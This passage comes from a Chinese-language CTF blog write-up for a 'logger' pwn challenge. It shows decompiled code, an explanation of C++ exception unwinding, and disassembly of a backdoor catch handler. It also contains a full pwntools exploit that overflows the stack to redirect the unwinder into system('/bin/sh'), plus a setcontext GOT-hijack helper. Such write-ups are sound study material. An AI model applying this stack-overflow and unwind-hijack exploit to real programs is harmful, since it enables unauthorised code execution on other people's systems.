  <span class="token function">clean_up</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_4014FD</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\x1B[1;31m%s\x1B[0m\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Type your message here plz: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">HIBYTE</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  buf<span class="token punctuation">[</span>v0 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">></span> <span class="token number">0x10</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>byte_404200<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte_404200<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">": "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strncat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> byte_404200<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
    exception <span class="token operator">=</span> <span class="token function">__cxa_allocate_exception</span><span class="token punctuation">(</span><span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span>exception <span class="token operator">=</span> src<span class="token punctuation">;</span>
    <span class="token function">__cxa_throw</span><span class="token punctuation">(</span>exception<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">type_info</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>`typeinfo <span class="token keyword">for</span>'<span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>byte_404100<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte_404100<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_4014FD</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[User input log]\nMessage: %s\nDone at %s\n"</span><span class="token punctuation">,</span> byte_404100<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_401CCA</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v7 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>cpp的异常处理围绕着三个步骤进行处理，unwind cleanup handler，unwind会调用一些函数来判断当前栈帧中有没有能处理异常的逻辑，如果有就会把控制权转移到那边处理异常，如果没有，unwind就会找父函数有没有处理异常的逻辑，具体是怎么找的，是通过rbp和 rbp + 8 去确定父函数的栈帧位置，当前函数找不到就会调用cleanup去清理资源，然后根据rbp和rbp + 8去回溯到上一个栈帧那，直到unwind找到一个可以捕获异常的逻辑，就会把控制权转交过去然后由这段逻辑进行handler。</p>
<p>如果把rbp + 8覆盖成一个其他的try块的地址，就能扰乱unwind栈展开的流程，logger中有一段backdoor 也是catch一个字符串类型的异常，通过覆盖返回地址就可以把控制流劫持到这个位置执行backdoor，先通过上面的越界写去写一个binsh的字符串，然后覆盖返回地址扰乱unwind的流程 使这个异常被backdoor handler处理，最后getshell</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BC2                               <span class="token punctuation">;</span>   try <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BC2 E8 <span class="token number">69</span> F7 FF FF                call    ___cxa_throw
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BC2                               <span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span class="token comment">// starts at 401BC2</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BC2
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BC7                               <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BC7                               <span class="token punctuation">;</span>   <span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token comment">// owned by 401BC2</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BC7 F3 <span class="token number">0F</span> <span class="token number">1</span>E FA                   endbr64
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BCB <span class="token number">48</span> <span class="token number">83</span> FA <span class="token number">01</span>                   cmp     rdx<span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BCF <span class="token number">74</span> <span class="token number">08</span>                         jz      <span class="token keyword">short</span> loc_401BD9
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BCF
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BD1 <span class="token number">48</span> <span class="token number">89</span> C7                      mov     rdi<span class="token punctuation">,</span> rax
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BD4 E8 <span class="token number">67</span> F7 FF FF                call    __Unwind_Resume
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BD4
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BD9                               <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BD9
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BD9                               loc_401BD9<span class="token operator">:</span>                             <span class="token punctuation">;</span> CODE XREF<span class="token operator">:</span> <span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BCF↑j
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BD9 <span class="token number">48</span> <span class="token number">89</span> C7                      mov     rdi<span class="token punctuation">,</span> rax
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BDC E8 FF F5 FF FF                call    ___cxa_begin_catch
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BDC
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BE1 <span class="token number">48</span> <span class="token number">89</span> <span class="token number">45</span> E8                   mov     <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">18</span>h<span class="token punctuation">]</span><span class="token punctuation">,</span> rax
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BE5 <span class="token number">48</span> <span class="token number">8</span>B <span class="token number">45</span> E8                   mov     rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">18</span>h<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BE9 <span class="token number">48</span> <span class="token number">89</span> C6                      mov     rsi<span class="token punctuation">,</span> rax
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BEC <span class="token number">48</span> <span class="token number">8</span>D <span class="token number">05</span> AD <span class="token number">06</span> <span class="token number">00</span> <span class="token number">00</span>          lea     rax<span class="token punctuation">,</span> aAnExceptionOfT_1          <span class="token punctuation">;</span> <span class="token string">"[-] An exception of type String was cau"</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BF3 <span class="token number">48</span> <span class="token number">89</span> C7                      mov     rdi<span class="token punctuation">,</span> rax
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BF6 B8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>                mov     eax<span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BFB                               <span class="token punctuation">;</span>   try <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BFB E8 D0 F5 FF FF                call    _printf
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>BFB
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>C00 <span class="token number">48</span> <span class="token number">8</span>B <span class="token number">45</span> E8                   mov     rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">18</span>h<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>C04 <span class="token number">48</span> <span class="token number">89</span> C7                      mov     rdi<span class="token punctuation">,</span> rax
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>C07 E8 <span class="token number">54</span> F6 FF FF                call    _system
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401</span>C07                               <span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
PORT <span class="token operator">=</span> <span class="token number">9999</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_ucontext</span><span class="token punctuation">(</span>
    src<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    rsp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r12<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r13<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r14<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r15<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rsi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rcx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r8<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r9<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rip<span class="token operator">=</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytearray</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0xE0</span><span class="token punctuation">:</span><span class="token number">0xE8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>src<span class="token punctuation">)</span>  <span class="token comment"># fldenv ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x1C0</span><span class="token punctuation">:</span><span class="token number">0x1C8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1F80</span><span class="token punctuation">)</span>  <span class="token comment"># ldmxcsr</span>

    b<span class="token punctuation">[</span><span class="token number">0xA0</span><span class="token punctuation">:</span><span class="token number">0xA8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">:</span><span class="token number">0x88</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x78</span><span class="token punctuation">:</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x48</span><span class="token punctuation">:</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">:</span><span class="token number">0x58</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x58</span><span class="token punctuation">:</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>

    b<span class="token punctuation">[</span><span class="token number">0xA8</span><span class="token punctuation">:</span><span class="token number">0xB0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rip<span class="token punctuation">)</span>  <span class="token comment"># ret ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x70</span><span class="token punctuation">:</span><span class="token number">0x78</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token punctuation">:</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x98</span><span class="token punctuation">:</span><span class="token number">0xA0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r8<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">:</span><span class="token number">0x38</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r9<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x88</span><span class="token punctuation">:</span><span class="token number">0x90</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>

    <span class="token keyword">return</span> b


<span class="token keyword">def</span> <span class="token function">setcontext32</span><span class="token punctuation">(</span>libc<span class="token punctuation">:</span> ELF<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    got <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_PLTGOT"</span><span class="token punctuation">)</span>
    plt_trampoline <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    <span class="token keyword">return</span> got<span class="token punctuation">,</span> flat<span class="token punctuation">(</span>
        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>plt_trampoline<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        create_ucontext<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">,</span> rsp<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token comment"># e.g. dest, payload = setcontext32.setcontext32(</span>
<span class="token comment">#         libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()</span>
<span class="token comment">#     )</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

binsh <span class="token operator">=</span> <span class="token number">0x4040A0</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"Your chocie:"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"here: "</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"records? "</span><span class="token punctuation">,</span> <span class="token string">b'n'</span><span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">"Your chocie:"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">"here: "</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh;'</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">"records? "</span><span class="token punctuation">,</span> <span class="token string">b'n'</span><span class="token punctuation">)</span>


sla<span class="token punctuation">(</span><span class="token string">"Your chocie:"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x70</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401bc7</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"plz: "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/09/07/byuctf-iot/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/09/02/gdbjail/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-09-04 
	</div>
